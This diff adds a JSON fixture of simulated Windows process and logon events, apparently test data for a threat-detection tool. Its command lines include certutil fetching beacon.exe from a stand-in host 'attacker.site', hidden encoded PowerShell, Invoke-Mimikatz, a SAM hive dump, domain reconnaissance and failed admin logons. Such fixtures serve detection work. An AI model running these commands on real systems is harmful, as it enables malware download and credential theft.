@@ -1,0 +1,115 @@
+[
+  {
+    "EventID": 1,
+    "UtcTime": "2026-10-21 16:10:00.000",
+    "Computer": "THREAT-HOST",
+    "ProcessId": 5010,
+    "ParentProcessId": 1000,
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil.exe -urlcache -split -f http://attacker.site/beacon.exe C:\\Windows\\Temp\\beacon.exe",
+    "User": "CORP\\victim"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-10-21 16:10:05.000",
+    "Computer": "THREAT-HOST",
+    "ProcessId": 5020,
+    "ParentProcessId": 1000,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAg...",
+    "User": "CORP\\victim"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-10-21 16:10:10.000",
+    "Computer": "THREAT-HOST",
+    "ProcessId": 5030,
+    "ParentProcessId": 2500,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe /c whoami /all",
+    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+    "User": "CORP\\victim"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-10-21 16:10:15.000",
+    "Computer": "THREAT-HOST",
+    "ProcessId": 5040,
+    "ParentProcessId": 3500,
+    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "CommandLine": "powershell.exe -NoProfile -Command Invoke-Mimikatz",
+    "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    "User": "CORP\\victim"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-10-21 16:10:20.000",
+    "Computer": "THREAT-HOST",
+    "ProcessId": 5050,
+    "ParentProcessId": 5030,
+    "Image": "C:\\Windows\\System32\\whoami.exe",
+    "CommandLine": "whoami.exe /all",
+    "User": "CORP\\victim"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-10-21 16:10:25.000",
+    "Computer": "THREAT-HOST",
+    "ProcessId": 5060,
+    "ParentProcessId": 5030,
+    "Image": "C:\\Windows\\System32\\net.exe",
+    "CommandLine": "net.exe user /domain",
+    "User": "CORP\\victim"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-10-21 16:10:30.000",
+    "Computer": "THREAT-HOST",
+    "ProcessId": 5070,
+    "ParentProcessId": 5030,
+    "Image": "C:\\Windows\\System32\\reg.exe",
+    "CommandLine": "reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.hive",
+    "User": "CORP\\victim"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-10-21 16:10:35.000",
+    "Computer": "THREAT-HOST",
+    "ProcessId": 5080,
+    "ParentProcessId": 5030,
+    "Image": "C:\\Users\\victim\\AppData\\Local\\Temp\\staged_loader.exe",
+    "CommandLine": "C:\\Users\\victim\\AppData\\Local\\Temp\\staged_loader.exe --connect",
+    "User": "CORP\\victim"
+  },
+  {
+    "EventID": 4625,
+    "UtcTime": "2026-10-21 16:15:00.000",
+    "Computer": "AUTH-HOST",
+    "TargetUserName": "admin",
+    "IpAddress": "10.0.0.99"
+  },
+  {
+    "EventID": 4625,
+    "UtcTime": "2026-10-21 16:15:10.000",
+    "Computer": "AUTH-HOST",
+    "TargetUserName": "admin",
+    "IpAddress": "10.0.0.99"
+  },
+  {
+    "EventID": 4625,
+    "UtcTime": "2026-10-21 16:15:20.000",
+    "Computer": "AUTH-HOST",
+    "TargetUserName": "admin",
+    "IpAddress": "10.0.0.99"
+  },
+  {
+    "EventID": 1,
+    "UtcTime": "2026-10-21 16:15:35.000",
+    "Computer": "AUTH-HOST",
+    "ProcessId": 9900,
+    "ParentProcessId": 400,
+    "Image": "C:\\Windows\\System32\\cmd.exe",
+    "CommandLine": "cmd.exe",
+    "User": "CORP\\admin"
+  }
+]
